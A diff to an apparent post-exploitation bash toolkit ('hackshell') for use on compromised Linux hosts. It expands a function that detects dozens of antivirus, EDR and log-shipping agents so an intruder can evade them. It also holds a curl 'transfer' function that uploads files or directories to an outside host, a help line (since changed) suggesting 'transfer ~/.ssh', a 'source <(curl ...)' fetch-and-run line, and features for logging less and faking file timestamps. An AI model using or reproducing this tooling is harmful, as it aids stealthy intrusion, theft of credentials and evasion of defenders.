@@ -342,7 +342,7 @@ transfer() {
     [[ $# -eq 0 ]] && { echo -e >&2 "Usage:\n    transfer [file/directory]\n    transfer [name] <FILENAME"; return 255; }
     [[ ! -t 0 ]] && { curl -SsfL --progress-bar -T "-" "https://${HS_TRANSFER_PROVIDER}/${1}"; return; }
     [[ ! -e "$1" ]] && { echo -e >&2 "Not found: $1"; return 255; }
-    [[ -d "$1" ]] && { (cd "${1}/.."; tar cfz - "${1##*/}")|curl -SsfL --connect-timeout 7 --progress-bar -T "-" "https://${HS_TRANSFER_PROVIDER}/${1##*/}.tar.gz"; return; }
+    [[ -d "$1" ]] && { (cd "${1}/.." && tar cfz - "${1##*/}")|curl -SsfL --connect-timeout 7 --progress-bar -T "-" "https://${HS_TRANSFER_PROVIDER}/${1##*/}.tar.gz"; return; }
     curl -SsfL --connect-timeout 7 --progress-bar -T "$1" "https://${HS_TRANSFER_PROVIDER}/${1##*/}"
 }
 
@@ -880,57 +880,115 @@ gsnc() {
 }
 command -v gs-netcat >/dev/null || gs-netcat() { gsnc "$@"; }
 
+# https://github.com/hackerschoice/hackshell/issues/6
 _warn_edr() {
     local fns s out
 
     _hs_chk_systemd() { systemctl is-active "${1:?}" &>/dev/null && out+="${2:?}: systemctl status $1"$'\n';}
     _hs_chk_fn() { { [ -z "${1}" ] || [ ! -e "${1:?}" ]; } && return; fns+=("${1:?}"); out+="${2:?}: $1"$'\n';}
 
+    _hs_chk_fn "/usr/lib/Acronis"                           "Acronis Cyber Protect"
+    _hs_chk_fn "/etc/init.d/avast"                          "Avast"
+    _hs_chk_fn "/var/lib/avast/Setup/avast.vpsupdate"       "Avast"
+    _hs_chk_fn "/etc/init.d/avgd"                           "AVG"
+    _hs_chk_fn "/opt/avg"                                   "AVG"
+    _hs_chk_fn "/var/log/checkpoint"                        "Checkpoint"
+    _hs_chk_fn "/opt/cisco/amp/bin/ampcli"                  "Cisco Secure Endpoint"
     _hs_chk_fn "/etc/clamd.d/scan.conf"                     "ClamAV"
     _hs_chk_fn "$(command -v clamscan)"                     "ClamAV"
     _hs_chk_fn "/etc/freshclam.conf"                        "ClamAV"
-    _hs_chk_fn "/opt/360sdforcnos/eppagent"                 "EDR ?"
+    _hs_chk_fn "/opt/COMODO"                                "Comodo AV"
     _hs_chk_fn "/opt/CrowdStrike"                           "CrowdShite"
+    _hs_chk_fn "/opt/cyberark"                              "CyberArk"
+    _hs_chk_fn "/opt/360sdforcnos"                          "EDR ?"
+    _hs_chk_fn "/etc/filebeat"                              "Filebeat (not AV/EDR, but used to ship logs)"
+    _hs_chk_fn "/opt/fireeye"                               "FireEye/Trellix EDR"
+    _hs_chk_fn "/opt/isec"                                  "FireEye/Trellix Endpoint Security"
+    _hs_chk_fn "/opt/McAfee"                                "FireEye/McAfee/Trellix Agent"
+    _hs_chk_fn "/opt/Trellix"                               "FireEye/McAfee/Trellix SIEM Collector"
+    _hs_chk_fn "/opt/FortiEDRCollector"                     "Fortinet FortiEDR"
+    _hs_chk_fn "/opt/fortinet/fortisiem"                    "Fortinet FortiSIEM"
+    _hs_chk_fn "/etc/init.d/fortisiem-linux-agent"          "Fortinet FortiSIEM"
+    _hs_chk_fn "/usr/local/bin/intezer-analyze"             "Intezer"
     _hs_chk_fn "/opt/kaspersky"                             "Kaspersky"
-    _hs_chk_fn "/var/opt/ds_agent/dsa_core/ds_agent.db"     "Trend Micro Deep Security Agent"
-    _hs_chk_fn "/opt/ds_agent/dsa"                          "Trend Micro Deep Security Agent"
+    _hs_chk_fn "/etc/init.d/kics"                           "Kaspersky Industrial CyberSecurity"
+    _hs_chk_fn "/usr/local/rocketcyber"                     "Kseya RocketCyber"
+    _hs_chk_fn "/etc/init.d/limacharlie"                    "LimaCharlie Agent"
+    _hs_chk_fn "/etc/logrhythm"                             "LogRhythm Axon"
+    _hs_chk_fn "/bin/logrhythm"                             "LogRhythm Axon"
+    _hs_chk_fn "opt/logrhythm/scsm"                         "LogRhythm System Monitor"
+    _hs_chk_fn "/etc/init.d/scsm"                           "LogRhythm System Monitor"
+    _hs_chk_fn "/var/pt"                                    "PT Swarm"
+    _hs_chk_fn "/usr/local/qualys"                          "Qualys EDR Cloud Agent"
+    _hs_chk_fn "/etc/init.d/qualys-cloud-agent"             "Qualys EDR Cloud Agent"
     _hs_chk_fn "/etc/rkhunter.conf"                         "RootKit Hunter"
     _hs_chk_fn "$(command -v rkhunter)"                     "RootKit Hunter"
     _hs_chk_fn "/etc/safedog/sdsvrd.conf"                   "Safedog"
     _hs_chk_fn "/etc/safedog/server/conf/sdsvrd.conf"       "Safedog"
     _hs_chk_fn "/sf/edr/agent/bin/edr_agent"                "Sangfor EDR"
-    _hs_chk_fn "/titan/agent/agent_update.sh"               "Titan Agent"
+    _hs_chk_fn "/opt/secureworks"                           "Secureworks"
+    _hs_chk_fn "/opt/splunkforwarder"                       "Splunk"
+    _hs_chk_fn "/opt/SumoCollector"                         "Sumo Logic Cloud SIEM"
+    _hs_chk_fn "/etc/otelcol-sumo/sumologic.yaml"           "Sumo Logic OTEL Collector"
+    _hs_chk_fn "/opt/Symantec"                              "Symantec EDR"
+    _hs_chk_fn "/etc/init.d/sisamdagent"                    "Symantec EDR"
+    _hs_chk_fn "/usr/lib/symantec/status.sh"                "Symantec Linux Agent"
+    _hs_chk_fn "/opt/Tanium"                                "Tanium"
     _hs_chk_fn "/opt/threatbook/OneAV"                      "threatbook.OneAV"
     _hs_chk_fn "/usr/bin/oneav_start"                       "threatbook.OneAV"
+    _hs_chk_fn "/opt/threatconnect-envsvr/"                 "ThreatConnect"
+    _hs_chk_fn "/etc/init.d/threatconnect-envsvr"           "ThreatConnect"
+    _hs_chk_fn "/titan/agent/agent_update.sh"               "Titan Agent"
+    _hs_chk_fn "/etc/init.d/ds_agent"                       "Trend Micro Deep Instinct"
+    _hs_chk_fn "/opt/ds_agent/dsa"                          "Trend Micro Deep Security Agent"
+    _hs_chk_fn "/etc/init.d/splx"                           "Trend Micro Server Protect"
+    _hs_chk_fn "/etc/opt/f-secure"                          "WithSecure (F-Secure)"
+    _hs_chk_fn "/opt/f-secure"                              "WithSecure (F-Secure)"
 
-    [ "${#fns[@]}" -ne 0 ] && out="$(\ls -alrt "${fns[@]}")"$'\n'
+    [ "${#fns[@]}" -ne 0 ] && out+="$(\ls -alrtd "${fns[@]}")"$'\n'
 
-    _hs_chk_systemd "armor"                             "Rapid7 NG AV"
+    _hs_chk_systemd "avast"                             "Avast"
     _hs_chk_systemd "bdsec"                             "Bitdefender EDR / GavityZone XDR"
-    _hs_chk_systemd "cbsensor"                          "CarbonBlack"
-    _hs_chk_systemd "cybereason-sensor"                 "Cybereason"
     _hs_chk_systemd "cylancesvc"                        "Blackberry cyPROTECT"
     _hs_chk_systemd "cyoptics"                          "Blackberry cyOPTICS"
-    _hs_chk_systemd "ds_agent"                          "Trend Micro"
+    _hs_chk_systemd "cbsensor"                          "CarbonBlack"
+    _hs_chk_systemd "cpla"                              "Checkpoint"
+    _hs_chk_systemd "itsm"                              "Comodo Client Security"
+    _hs_chk_systemd "falcon-sensor"                     "CrowdStrike"
+    _hs_chk_systemd "epmd"                              "CyberArk"
+    _hs_chk_systemd "cybereason-sensor"                 "Cybereason"
     _hs_chk_systemd "elastic-agent"                     "Elastic Security"
+    _hs_chk_systemd "sraagent"                          "ESET Endpoint Security"
+    _hs_chk_systemd "eraagent"                          "ESET Endpoint Security"
     _hs_chk_systemd "eea"                               "ESET AV"
     _hs_chk_systemd "eea-user-agent"                    "ESET AV agent"
-    _hs_chk_systemd "emit_scand_service"                "WithSecure (F-Secure) Elements Agent"
-    _hs_chk_systemd "falcon-sensor"                     "CrowdStrike"
-    _hs_chk_systemd "f-secure-linuxsecurity-activate"   "WithSecure (F-Secure) Elements Agent"
-    _hs_chk_systemd "ir_agent"                          "Rapid7 INSIGHT IDR"
-    _hs_chk_systemd "klnagent64"                        "Kaspersky Network Agent"
+    _hs_chk_systemd "xagt"                              "FireEye/Trellix EDR"
     _hs_chk_systemd "keeperx"                           "IBM QRADAR"
+    _hs_chk_systemd "kesl"                              "Kaspersky Endpoint Security"
+    _hs_chk_systemd "klnagent64"                        "Kaspersky Network Agent"
+    _hs_chk_systemd "kesl-supervisor"                   "Kaspersky Endpoint Security (Elbrus Edition)"
+    _hs_chk_systemd "kics"                              "Kaspersky Industrial CyberSecurity"
+    _hs_chk_systemd "kess"                              "Kaspersky Embedded Systems Security"
+    _hs_chk_systemd "rocketcyber"                       "Kseya RocketCyber"
+    _hs_chk_systemd "limacharlie"                       "LimaCharlie Agent"
+    _hs_chk_systemd "lr-agent.logrhythm"                "LogRhythm Axon"
     _hs_chk_systemd "MFEcma"                            "McAfee"
     _hs_chk_systemd "mdatp"                             "MS defender"
     _hs_chk_systemd "osqueryd"                          "OSQuery"
+    _hs_chk_systemd "traps_pmd"                         "Palo Alto Networks Cortex XDR"
+    _hs_chk_systemd "ir_agent"                          "Rapid7 INSIGHT IDR"
+    _hs_chk_systemd "armor"                             "Rapid7 NG AV"
     _hs_chk_systemd "sophoslinuxsensor"                 "Sophos Intercept X"
     _hs_chk_systemd "sophos-spl"                        "Sophos SPL"
+    _hs_chk_systemd "otelcol-sumo"                      "Sumo Logic OTEL Collector"
+    _hs_chk_systemd "ds_agent"                          "TrendMicro - Deep Instinct"
     _hs_chk_systemd "titanagent"                        "Titanagent EDR"
+    _hs_chk_systemd "taniumclient"                      "Tanium"
     _hs_chk_systemd "oneavd"                            "threatbook.OneAV"
-    _hs_chk_systemd "sraagent"                          "ESET Endpoint Security"
-    _hs_chk_systemd "traps_pmd"                         "Palo Alto Networks Cortex XDR"
+    _hs_chk_systemd "mbdaemon"                          "ThreatDown (MalwareBytes) Nebula EDR Agent"
     _hs_chk_systemd "wazuh-agent"                       "Wazuh"
+    _hs_chk_systemd "emit_scand_service"                "WithSecure (F-Secure) Elements Agent"
+    _hs_chk_systemd "f-secure-linuxsecurity-activate"   "WithSecure (F-Secure) Elements Agent"
 
     [ -n "$out" ] && {
         echo -e "${CR}AV/EDR found ${CF}"
@@ -1557,7 +1615,7 @@ ${CDC} bounce <port> <dst-ip> <dst-port>     ${CDM}Bounce tcp traffic to destina
 ${CDC} ghostip                               ${CDM}Originate from a non-existing IP
 ${CDC} burl http://ipinfo.io 2>/dev/null     ${CDM}Request URL ${CN}${CF}[no https support]
 ${CDC} dl http://ipinfo.io 2>/dev/null       ${CDM}Request URL using one of curl/wget/python/perl/openssl
-${CDC} transfer ~/.ssh                       ${CDM}Upload a file or directory ${CN}${CF}[${HS_TRANSFER_PROVIDER}]
+${CDC} transfer <file>                       ${CDM}Upload a file or directory ${CN}${CF}[${HS_TRANSFER_PROVIDER}]
 ${CDC} shred file                            ${CDM}Securely delete a file
 ${CDC} notime <file> touch foo.dat           ${CDM}Execute a command at the <file>'s mtime
 ${CDC} notime_cp <src> <dst>                 ${CDM}Copy file. Keep birth-time, ctime, mtime & atime
@@ -1596,11 +1654,13 @@ hs_init_shell
 xhelp
 
 ### Finishing
-[ -n "$_HSURLORIGIN" ] && HS_WARN "Better use: ' ${CDC}source <(curl -SsfL ${_HSURL})${CDM}'${CN}"
 echo -e ">>> Type ${CDC}xhome${CN} to set HOME=${CDY}${XHOME}${CN}"
 echo -e ">>> Tweaking environment variables to log less     ${CN}[${CDG}DONE${CN}]"
 echo -e ">>> Creating aliases to make commands log less     ${CN}[${CDG}DONE${CN}]"
 echo -e ">>> ${CG}Setup complete. ${CF}No data was written to the filesystem${CN}"
+
+# Warning if thc.org is used
+[ -n "$_HSURLORIGIN" ] && HS_WARN "Better use: ' ${CDC}source <(curl -SsfL ${_HSURL})${CDM}'${CN}"
 
 ### Check for obvious loots
 lootlight
